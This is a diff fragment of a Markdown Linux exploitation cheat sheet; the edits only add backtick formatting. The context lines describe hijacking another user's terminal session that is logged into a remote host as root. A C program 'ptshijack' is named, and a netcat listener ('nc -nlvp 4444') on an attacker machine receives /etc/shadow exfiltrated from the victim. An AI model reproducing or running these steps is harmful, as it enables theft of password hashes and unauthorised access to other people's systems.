@@ -14,7 +14,7 @@ An assortment of techniques that can be used to exploit Linux.  Most of these as
 Example output, you see user "bill" on "pts/1" connected to a remote host (C) as "root".<br />
 `bill     18953 18855  0 08:42 pts/1    00:00:00 ssh root@192.168.10.10`
 
-Compile the following C code on (B) as `ptshijack.c` to get /etc/shadow from (C).<br />
+Compile the following C code on (B) as `ptshijack.c` to get `/etc/shadow` from (C).<br />
 ```c
 #include <fcntl.h>
 #include <stdio.h>
@@ -42,7 +42,7 @@ int main() {
 }
 ```
 
-**Start netcat on (A) to receive /etc/shadow from (C)**<br />
+**Start netcat on (A) to receive** `/etc/shadow` **from (C)**<br />
 ```nc -nlvp 4444```
 
 **Execute** `ptshijack` **on (B) to send** `/etc/shadow` **from (C) to (A)**<br />
